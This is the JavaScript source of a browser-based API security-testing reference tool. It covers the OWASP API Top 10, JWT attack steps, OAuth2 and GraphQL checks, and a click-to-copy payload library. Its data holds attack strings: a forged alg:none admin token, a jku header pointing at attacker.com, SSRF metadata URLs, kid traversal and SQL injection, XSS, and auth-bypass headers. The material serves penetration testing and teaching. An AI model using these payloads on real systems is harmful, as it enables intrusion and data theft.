// API Security Scanner — API testing, JWT analysis, OAuth reference, OWASP API Top 10
// Decode a base64url JWT segment to its parsed JSON, handling padding and
// UTF-8 claims (atob yields a Latin-1 byte string; decode it as UTF-8 so
// non-ASCII claim values are not mangled).
function _jwtSegJson(seg) {
  var s = String(seg).replace(/-/g, "+").replace(/_/g, "/");
  while (s.length % 4) s += "=";
  var bin = atob(s);
  var bytes = new Uint8Array(bin.length);
  for (var i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
  return JSON.parse(new TextDecoder("utf-8").decode(bytes));
}
const esc = (s) => String(s == null ? '' : s).replace(/[&<>"']/g, (c) => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));

const OWASP_API_TOP10 = [
  {id: 'API1', name: 'Broken Object Level Authorization', desc: 'APIs expose endpoints that handle object identifiers, creating a wide attack surface for Object Level Access Control issues.', test: 'Change object IDs in requests (e.g., /api/users/123 to /api/users/124) and check if you can access other users\' data.', payloads: ['/api/v1/users/VICTIM_ID/profile', '/api/v1/orders/OTHER_ORDER_ID', '/api/v1/documents/OTHER_DOC_ID/download']},
  {id: 'API2', name: 'Broken Authentication', desc: 'Authentication mechanisms are often implemented incorrectly, allowing attackers to compromise authentication tokens or exploit implementation flaws.', test: 'Test for weak passwords, credential stuffing, missing rate limiting on login, token leakage, insecure token storage.', payloads: ['Missing rate limiting on /auth/login', 'JWT with alg:none', 'Brute force API key']},
  {id: 'API3', name: 'Broken Object Property Level Authorization', desc: 'APIs expose endpoints that return all object properties without considering which ones should be readable or writable by the user.', test: 'Check if API responses include sensitive fields. Try adding extra fields in PUT/PATCH requests (mass assignment).', payloads: ['Add "role":"admin" to profile update', 'Add "isAdmin":true to user object', 'Add "price":0 to order object']},
  {id: 'API4', name: 'Unrestricted Resource Consumption', desc: 'APIs do not restrict the size or number of resources that can be requested, leading to DoS.', test: 'Test with large payloads, many concurrent requests, deeply nested JSON, large file uploads, pagination abuse.', payloads: ['GET /api/users?limit=999999', 'POST with 100MB JSON body', 'Deeply nested JSON (100 levels)']},
  {id: 'API5', name: 'Broken Function Level Authorization', desc: 'Complex access control policies with different hierarchies, groups, and roles, often lead to authorization flaws.', test: 'Access admin endpoints with regular user tokens. Change HTTP methods (GET to DELETE). Try /admin/ paths.', payloads: ['GET /api/admin/users (with regular token)', 'DELETE /api/v1/users/123 (if only GET allowed)', 'PUT /api/v1/config/settings']},
  {id: 'API6', name: 'Unrestricted Access to Sensitive Business Flows', desc: 'APIs vulnerable to business flow abuse: buying tickets, posting comments, making reservations without proper limitations.', test: 'Automate business flows: bulk purchase, mass account creation, scraping, spam submissions.', payloads: ['Automate checkout flow', 'Mass account registration', 'Bulk coupon redemption']},
  {id: 'API7', name: 'Server Side Request Forgery (SSRF)', desc: 'SSRF flaws occur when an API fetches a remote resource without validating the user-supplied URL.', test: 'Supply internal URLs (localhost, metadata endpoints, internal services) in URL parameters.', payloads: ['url=http://169.254.169.254/latest/meta-data/', 'url=http://localhost:6379/', 'url=http://internal-service:8080/admin']},
  {id: 'API8', name: 'Security Misconfiguration', desc: 'APIs and supporting systems may contain misconfigurations including missing security headers, unnecessary HTTP methods, CORS misconfig.', test: 'Check CORS policy, security headers, error messages, HTTP methods, TLS configuration, debug endpoints.', payloads: ['OPTIONS request to check CORS', 'TRACE method enabled', 'Access /debug, /metrics, /health endpoints']},
  {id: 'API9', name: 'Improper Inventory Management', desc: 'APIs tend to expose more endpoints than traditional web apps, making proper documentation more important. Old API versions may still be accessible.', test: 'Find old API versions (/v1, /v2), undocumented endpoints, shadow APIs, deprecated parameters.', payloads: ['/api/v1/ (when v3 is current)', '/api/internal/', '/swagger.json, /openapi.yaml exposure']},
  {id: 'API10', name: 'Unsafe Consumption of APIs', desc: 'Developers tend to trust third-party API responses more than user input, adopting weaker security standards for interactions with third-party APIs.', test: 'Check if third-party API responses are validated/sanitized. Test for injection via upstream API data.', payloads: ['Inject payload in third-party webhook data', 'Poison upstream API cache', 'SSRF via redirect in third-party URL']},
];

const JWT_ATTACKS = [
  {name: 'Algorithm None Attack', desc: 'Change the JWT header algorithm to "none" and remove the signature.', steps: ['Decode the JWT header (Base64)', 'Change "alg" to "none"', 'Re-encode the header', 'Remove the signature (keep the trailing dot)', 'Submit the modified token'], payload: 'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTcwMDAwMDAwMH0.'},
  {name: 'Key Confusion (RS256 to HS256)', desc: 'If the server uses RS256 but also accepts HS256, sign the token with the public key as HMAC secret.', steps: ['Obtain the server\'s RSA public key', 'Change header "alg" to "HS256"', 'Sign the token using the public key as the HMAC-SHA256 secret', 'Submit the modified token'], payload: 'Change alg:RS256 to alg:HS256, sign with public key'},
  {name: 'JWK Header Injection', desc: 'Inject a JWK (JSON Web Key) into the JWT header, and sign the token with your own key.', steps: ['Generate your own RSA key pair', 'Add "jwk" claim to JWT header with your public key', 'Sign the token with your private key', 'The server may trust the embedded key'], payload: '{"alg":"RS256","jwk":{"kty":"RSA","n":"...","e":"AQAB"}}'},
  {name: 'JKU Header Injection', desc: 'Set the "jku" header to point to your own JWKS endpoint.', steps: ['Host a JWKS endpoint with your public key', 'Set JWT header "jku" to your endpoint URL', 'Sign the token with your private key', 'The server fetches keys from your endpoint'], payload: '{"alg":"RS256","jku":"https://attacker.com/.well-known/jwks.json"}'},
  {name: 'KID Path Traversal', desc: 'The "kid" parameter may be vulnerable to directory traversal or SQL injection.', steps: ['Try kid values like: ../../dev/null', 'Try kid: " UNION SELECT "secret" --', 'Try kid pointing to a known file with predictable content'], payload: '{"alg":"HS256","kid":"../../dev/null"}'},
  {name: 'Claim Manipulation', desc: 'Modify JWT claims to escalate privileges.', steps: ['Decode the JWT payload', 'Change "role" to "admin" or "sub" to admin user ID', 'Change "exp" to far future', 'Re-sign if algorithm allows (none/HS256 confusion)'], payload: '{"sub":"admin","role":"administrator","exp":9999999999}'},
];

const OAUTH_FLOWS = [
  {name: 'Authorization Code', desc: 'Most secure flow for server-side apps. Uses a code exchange for tokens.', attacks: ['Open redirect via redirect_uri', 'Authorization code interception', 'CSRF on callback endpoint', 'PKCE bypass for public clients', 'Scope escalation']},
  {name: 'Authorization Code + PKCE', desc: 'Recommended for SPAs and mobile apps. Adds proof key to prevent code interception.', attacks: ['Downgrade to non-PKCE flow', 'Code verifier brute force (if weak)', 'Method downgrade (S256 to plain)']},
  {name: 'Client Credentials', desc: 'Server-to-server authentication. Client authenticates with its own credentials.', attacks: ['Client secret exposure', 'Overly permissive scopes', 'Token leakage in logs']},
  {name: 'Implicit (deprecated)', desc: 'Token returned directly in URL fragment. Deprecated due to token leakage.', attacks: ['Token leakage via Referer header', 'Token leakage via browser history', 'Open redirect for token theft', 'No refresh token rotation']},
  {name: 'Device Code', desc: 'For devices with no browser. User authorizes on another device.', attacks: ['Social engineering (phishing the device code)', 'Polling abuse', 'Code brute force']},
];

const GRAPHQL_CHECKS = [
  {name: 'Introspection Enabled', query: '{"query":"{__schema{types{name fields{name type{name}}}}}"}', desc: 'Fetch the entire schema. Should be disabled in production.', risk: 'medium'},
  {name: 'Field Suggestions', query: '{"query":"{user{passwor}}"}', desc: 'GraphQL may suggest field names in error messages, leaking schema info.', risk: 'low'},
  {name: 'Batch Query Abuse', query: '[{"query":"{user(id:1){name}}"},{"query":"{user(id:2){name}}"},...]', desc: 'Send multiple queries in one request to bypass rate limiting.', risk: 'medium'},
  {name: 'Deeply Nested Query (DoS)', query: '{"query":"{users{posts{comments{author{posts{comments{author}}}}}}}"}', desc: 'Deeply nested queries can cause excessive resource consumption.', risk: 'high'},
  {name: 'SQL Injection via Arguments', query: '{"query":"{user(name:\\"admin\' OR 1=1--\\"){id}}"}', desc: 'If resolvers pass arguments directly to SQL queries.', risk: 'critical'},
  {name: 'Authorization Bypass', query: '{"query":"mutation{deleteUser(id:1){success}}"}', desc: 'Test if mutations enforce proper authorization.', risk: 'critical'},
  {name: 'Alias-based DoS', query: '{"query":"{a:user(id:1){name} b:user(id:2){name} c:user(id:3){name} ... }"}', desc: 'Use aliases to request the same expensive field many times.', risk: 'medium'},
  {name: 'Directive Overloading', query: '{"query":"{user(id:1) @skip(if:false) @skip(if:false) @skip(if:false) ... {name}}"}', desc: 'Overload with repeated directives for DoS.', risk: 'medium'},
];

const API_PAYLOADS = {
  'Authentication Bypass': [
    'Authorization: Bearer null',
    'Authorization: Bearer undefined',
    'Authorization: Bearer []',
    'Authorization: Bearer {"admin":true}',
    'X-Original-URL: /admin/users',
    'X-Rewrite-URL: /admin/users',
    'X-Forwarded-For: 127.0.0.1',
    'X-Custom-IP-Authorization: 127.0.0.1',
  ],
  'Mass Assignment': [
    '{"username":"test","role":"admin"}',
    '{"username":"test","isAdmin":true}',
    '{"username":"test","price":0}',
    '{"username":"test","verified":true}',
    '{"username":"test","credits":99999}',
  ],
  'IDOR': [
    '/api/users/1 (try 2, 3, ...)',
    '/api/orders/{uuid} (enumerate UUIDs)',
    '/api/files/../../etc/passwd',
    '/api/users/me vs /api/users/ADMIN_ID',
  ],
  'Rate Limiting': [
    'Send 100 requests in 1 second',
    'Rotate X-Forwarded-For headers',
    'Use different API keys',
    'Bypass via IP rotation',
  ],
  'Input Validation': [
    '{"email":"test@test.com","password":"a]]]]]]]"}',
    '{"amount":-1}',
    '{"quantity":99999999}',
    '{"name":"<script>alert(1)</script>"}',
    '{"search":"\\"; DROP TABLE users; --"}',
  ],
};

const TABS = [
  {id: 'owasp', label: 'OWASP API Top 10'},
  {id: 'jwt', label: 'JWT Attacks'},
  {id: 'oauth', label: 'OAuth2 Security'},
  {id: 'graphql', label: 'GraphQL Testing'},
  {id: 'payloads', label: 'API Payloads'},
  {id: 'decoder', label: 'JWT Decoder'},
  {id: 'curl', label: 'cURL Generator'},
];

export function renderAPISecurityScanner(main) {
  var activeTab = 'owasp';

  function render() {
    var tabsHtml = TABS.map(function(t) {
      return '<button class="tab' + (activeTab === t.id ? ' active' : '') + '" data-tab="' + t.id + '">' + esc(t.label) + '</button>';
    }).join('');

    main.innerHTML =
      '<h1 class="pg-h1">API Security Scanner</h1>' +
      '<p class="muted pg-sub">API security testing reference — OWASP API Top 10, JWT attacks, OAuth2 flows, GraphQL testing, and payload library.</p>' +
      '<div class="tab-bar" style="overflow-x:auto;flex-wrap:nowrap">' + tabsHtml + '</div>' +
      '<div id="api-content" style="margin-top:12px"></div>';

    main.querySelector('.tab-bar').onclick = function(e) {
      var b = e.target.closest('.tab');
      if (!b) return;
      activeTab = b.dataset.tab;
      render();
    };

    var content = main.querySelector('#api-content');
    if (activeTab === 'owasp') renderOwaspTab(content);
    else if (activeTab === 'jwt') renderJWTTab(content);
    else if (activeTab === 'oauth') renderOAuthTab(content);
    else if (activeTab === 'graphql') renderGraphQLTab(content);
    else if (activeTab === 'payloads') renderPayloadsTab(content);
    else if (activeTab === 'decoder') renderDecoderTab(content);
    else if (activeTab === 'curl') renderCurlTab(content);
  }

  function renderOwaspTab(el) {
    el.innerHTML =
      '<h2 class="pg-h2">OWASP API Security Top 10 (2023)</h2>' +
      OWASP_API_TOP10.map(function(item) {
        return '<div style="background:var(--card);border:1px solid var(--line);border-radius:6px;padding:14px;margin-bottom:10px">' +
          '<div style="display:flex;gap:8px;align-items:center;margin-bottom:6px">' +
          '<span style="color:var(--acc);font-weight:700;font-size:.9rem">' + esc(item.id) + '</span>' +
          '<span style="font-weight:600">' + esc(item.name) + '</span></div>' +
          '<p style="color:var(--mut);font-size:.78rem;margin:0 0 8px">' + esc(item.desc) + '</p>' +
          '<div style="font-size:.75rem;margin-bottom:6px"><strong>How to test:</strong> ' + esc(item.test) + '</div>' +
          '<div style="font-size:.72rem;color:var(--acc)">' +
          item.payloads.map(function(p){return '<code style="display:inline-block;background:var(--bg);border:1px solid var(--line);padding:2px 6px;margin:2px;border-radius:4px;cursor:pointer" onclick="navigator.clipboard.writeText(this.textContent)">' + esc(p) + '</code>'}).join(' ') +
          '</div></div>';
      }).join('');
  }

  function renderJWTTab(el) {
    el.innerHTML =
      '<h2 class="pg-h2">JWT Attack Reference</h2>' +
      '<p class="muted" style="margin-bottom:12px">' + JWT_ATTACKS.length + ' common JWT vulnerabilities with exploitation steps.</p>' +
      JWT_ATTACKS.map(function(a) {
        return '<div style="background:var(--card);border:1px solid var(--line);border-radius:6px;padding:14px;margin-bottom:10px">' +
          '<div style="font-weight:600;margin-bottom:6px;color:var(--txt)">' + esc(a.name) + '</div>' +
          '<p style="color:var(--mut);font-size:.78rem;margin:0 0 8px">' + esc(a.desc) + '</p>' +
          '<ol style="margin:0;padding-left:18px;font-size:.75rem;color:var(--txt);line-height:1.8">' +
          a.steps.map(function(s){return '<li>' + esc(s) + '</li>'}).join('') +
          '</ol>' +
          '<div style="margin-top:8px"><code style="display:block;background:var(--bg);border:1px solid var(--line);padding:8px;border-radius:4px;font-size:.72rem;color:var(--acc);word-break:break-all">' + esc(a.payload) + '</code></div>' +
          '</div>';
      }).join('');
  }

  function renderOAuthTab(el) {
    el.innerHTML =
      '<h2 class="pg-h2">OAuth 2.0 Security</h2>' +
      '<p class="muted" style="margin-bottom:12px">OAuth2 grant types and their attack surfaces.</p>' +
      OAUTH_FLOWS.map(function(flow) {
        return '<div style="background:var(--card);border:1px solid var(--line);border-radius:6px;padding:14px;margin-bottom:10px">' +
          '<div style="font-weight:600;margin-bottom:4px;color:var(--txt)">' + esc(flow.name) + '</div>' +
          '<p style="color:var(--mut);font-size:.78rem;margin:0 0 8px">' + esc(flow.desc) + '</p>' +
          '<div style="font-size:.75rem"><strong style="color:var(--acc)">Attack vectors:</strong></div>' +
          '<ul style="margin:4px 0 0;padding-left:18px;font-size:.75rem;color:var(--txt)">' +
          flow.attacks.map(function(a){return '<li>' + esc(a) + '</li>'}).join('') +
          '</ul></div>';
      }).join('');
  }

  function renderGraphQLTab(el) {
    el.innerHTML =
      '<h2 class="pg-h2">GraphQL Security Testing</h2>' +
      '<p class="muted" style="margin-bottom:12px">' + GRAPHQL_CHECKS.length + ' checks for GraphQL API security. Click a query to copy it.</p>' +
      '<div style="overflow-x:auto"><table style="width:100%;border-collapse:collapse;font-size:.78rem">' +
      '<thead><tr style="border-bottom:2px solid var(--line)">' +
      '<th style="padding:8px;text-align:left;color:var(--mut)">Check</th>' +
      '<th style="padding:8px;text-align:left;color:var(--mut)">Risk</th>' +
      '<th style="padding:8px;text-align:left;color:var(--mut)">Query</th>' +
      '</tr></thead><tbody>' +
      GRAPHQL_CHECKS.map(function(c) {
        var color = c.risk === 'critical' ? '#ff1744' : c.risk === 'high' ? '#ff9100' : c.risk === 'medium' ? '#ffd600' : 'var(--mut)';
        return '<tr style="border-bottom:1px solid var(--line)">' +
          '<td style="padding:8px"><div style="font-weight:600">' + esc(c.name) + '</div><div style="color:var(--mut);font-size:.72rem;margin-top:2px">' + esc(c.desc) + '</div></td>' +
          '<td style="padding:8px;color:' + color + ';font-weight:600;text-transform:uppercase;font-size:.7rem">' + esc(c.risk) + '</td>' +
          '<td style="padding:8px"><code style="font-size:.68rem;cursor:pointer;color:var(--acc);word-break:break-all" onclick="navigator.clipboard.writeText(this.textContent)">' + esc(c.query) + '</code></td></tr>';
      }).join('') +
      '</tbody></table></div>';
  }

  function renderPayloadsTab(el) {
    var cats = Object.keys(API_PAYLOADS);
    el.innerHTML =
      '<h2 class="pg-h2">API Testing Payloads</h2>' +
      '<p class="muted" style="margin-bottom:12px">Click any payload to copy it.</p>' +
      cats.map(function(cat) {
        return '<div style="background:var(--card);border:1px solid var(--line);border-radius:6px;padding:14px;margin-bottom:10px">' +
          '<div style="font-weight:600;color:var(--acc);margin-bottom:8px">' + esc(cat) + '</div>' +
          API_PAYLOADS[cat].map(function(p) {
            return '<code style="display:block;background:var(--bg);border:1px solid var(--line);padding:6px 10px;margin:4px 0;border-radius:4px;font-size:.72rem;cursor:pointer;color:var(--txt)" onclick="navigator.clipboard.writeText(this.textContent).then(()=>{this.style.borderColor=\'var(--acc)\';setTimeout(()=>this.style.borderColor=\'\',500)})">' + esc(p) + '</code>';
          }).join('') +
          '</div>';
      }).join('');
  }

  function renderDecoderTab(el) {
    el.innerHTML =
      '<h2 class="pg-h2">JWT Decoder</h2>' +
      '<p class="muted" style="margin-bottom:12px">Paste a JWT token to decode its header and payload. All processing happens in your browser.</p>' +
      '<textarea class="tk-in" id="jwt-input" rows="4" placeholder="Paste JWT token here (eyJ...)"></textarea>' +
      '<div class="tk-btns"><button class="btn sm" id="jwt-decode">Decode</button></div>' +
      '<div id="jwt-output" style="margin-top:12px"></div>';

    el.querySelector('#jwt-decode').onclick = function() {
      var token = el.querySelector('#jwt-input').value.trim();
      var output = el.querySelector('#jwt-output');
      if (!token) { output.innerHTML = '<p class="muted">Paste a JWT first.</p>'; return; }
      var parts = token.split('.');
      if (parts.length < 2) { output.innerHTML = '<p style="color:#ff1744">Invalid JWT: expected 3 dot-separated parts, got ' + parts.length + '</p>'; return; }
      try {
        var header = _jwtSegJson(parts[0]);
        var payload = _jwtSegJson(parts[1]);
        var warnings = [];
        if (header.alg === 'none') warnings.push('Algorithm is "none" — token is unsigned');
        if (header.alg === 'HS256' && header.typ === 'JWT') warnings.push('HS256 — check for key confusion attack if server uses RS256');
        if (payload.exp && payload.exp < Date.now()/1000) warnings.push('Token is expired (exp: ' + new Date(payload.exp*1000).toISOString() + ')');
        if (payload.exp && payload.exp > Date.now()/1000 + 365*86400) warnings.push('Token has very long expiry (>1 year)');
        if (payload.role === 'admin' || payload.admin === true || payload.isAdmin === true) warnings.push('Token has admin privileges');
        if (!payload.iss) warnings.push('No issuer (iss) claim');
        if (!payload.exp) warnings.push('No expiry (exp) claim');

        output.innerHTML =
          '<div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">' +
          '<div style="background:var(--card);border:1px solid var(--line);border-radius:6px;padding:14px">' +
          '<div style="font-weight:600;margin-bottom:8px;color:var(--acc)">Header</div>' +
          '<pre style="background:var(--bg);padding:10px;border-radius:4px;font-size:.75rem;overflow-x:auto;color:var(--txt)">' + esc(JSON.stringify(header, null, 2)) + '</pre></div>' +
          '<div style="background:var(--card);border:1px solid var(--line);border-radius:6px;padding:14px">' +
          '<div style="font-weight:600;margin-bottom:8px;color:var(--acc)">Payload</div>' +
          '<pre style="background:var(--bg);padding:10px;border-radius:4px;font-size:.75rem;overflow-x:auto;color:var(--txt)">' + esc(JSON.stringify(payload, null, 2)) + '</pre></div></div>' +
          (warnings.length > 0 ? '<div style="margin-top:12px;background:rgba(255,23,68,0.08);border:1px solid rgba(255,23,68,0.3);border-radius:6px;padding:12px">' +
          '<div style="font-weight:600;color:#ff1744;margin-bottom:6px">Warnings</div>' +
          warnings.map(function(w){return '<div style="font-size:.78rem;color:#ff9100;margin:2px 0">- ' + esc(w) + '</div>'}).join('') +
          '</div>' : '<div style="margin-top:12px;color:#00e676;font-size:.78rem">No obvious issues detected.</div>') +
          '<div style="margin-top:8px;font-size:.72rem;color:var(--mut)">Signature: ' + (parts[2] ? esc(parts[2].substring(0, 40)) + '...' : 'none') + '</div>';
      } catch(e) {
        output.innerHTML = '<p style="color:#ff1744">Failed to decode: ' + esc(e.message) + '</p>';
      }
    };
  }

  function renderCurlTab(el) {
    el.innerHTML =
      '<h2 class="pg-h2">cURL Command Generator</h2>' +
      '<p class="muted" style="margin-bottom:12px">Build API requests and generate the corresponding cURL command.</p>' +
      '<div style="display:grid;grid-template-columns:auto 1fr;gap:8px;align-items:center;margin-bottom:12px">' +
      '<label style="font-size:.78rem;color:var(--mut)">Method</label>' +
      '<select id="curl-method" class="tk-f" style="max-width:120px"><option>GET</option><option>POST</option><option>PUT</option><option>PATCH</option><option>DELETE</option><option>OPTIONS</option><option>HEAD</option></select>' +
      '<label style="font-size:.78rem;color:var(--mut)">URL</label>' +
      '<input id="curl-url" class="tk-f" placeholder="https://api.example.com/v1/users">' +
      '<label style="font-size:.78rem;color:var(--mut)">Auth</label>' +
      '<div style="display:flex;gap:6px"><select id="curl-auth" class="tk-f" style="max-width:120px"><option value="none">None</option><option value="bearer">Bearer Token</option><option value="basic">Basic Auth</option><option value="apikey">API Key</option></select><input id="curl-auth-val" class="tk-f" placeholder="token / user:pass / key"></div>' +
      '<label style="font-size:.78rem;color:var(--mut)">Headers</label>' +
      '<textarea id="curl-headers" class="tk-in" rows="2" placeholder="Content-Type: application/json&#10;X-Custom: value"></textarea>' +
      '<label style="font-size:.78rem;color:var(--mut)">Body</label>' +
      '<textarea id="curl-body" class="tk-in" rows="4" placeholder=\'{"key": "value"}\'></textarea>' +
      '</div>' +
      '<div class="tk-btns"><button class="btn sm" id="curl-gen">Generate cURL</button><button class="btn sm ghost" id="curl-copy">Copy</button></div>' +
      '<pre id="curl-output" class="tk-out" style="margin-top:12px"></pre>';

    el.querySelector('#curl-gen').onclick = function() {
      var method = el.querySelector('#curl-method').value;
      var url = el.querySelector('#curl-url').value.trim();
      var authType = el.querySelector('#curl-auth').value;
      var authVal = el.querySelector('#curl-auth-val').value.trim();
      var headers = el.querySelector('#curl-headers').value.trim();
      var body = el.querySelector('#curl-body').value.trim();

      if (!url) { el.querySelector('#curl-output').textContent = 'Enter a URL first.'; return; }

      var parts = ['curl -sk'];
      if (method !== 'GET') parts.push('-X ' + method);
      parts.push("'" + url + "'");

      if (authType === 'bearer' && authVal) parts.push("-H 'Authorization: Bearer " + authVal + "'");
      else if (authType === 'basic' && authVal) parts.push("-u '" + authVal + "'");
      else if (authType === 'apikey' && authVal) parts.push("-H 'X-API-Key: " + authVal + "'");

      if (headers) {
        headers.split('\n').forEach(function(h) {
          h = h.trim();
          if (h) parts.push("-H '" + h + "'");
        });
      }

      if (body && method !== 'GET') {
        if (!headers.toLowerCase().includes('content-type')) parts.push("-H 'Content-Type: application/json'");
        parts.push("-d '" + body.replace(/'/g, "'\\''") + "'");
      }

      el.querySelector('#curl-output').textContent = parts.join(' \\\n  ');
    };

    el.querySelector('#curl-copy').onclick = function() {
      var text = el.querySelector('#curl-output').textContent;
      if (text) navigator.clipboard.writeText(text).then(function() {
        el.querySelector('#curl-copy').textContent = 'Copied!';
        setTimeout(function(){el.querySelector('#curl-copy').textContent = 'Copy'}, 1000);
      });
    };
  }

  render();
}
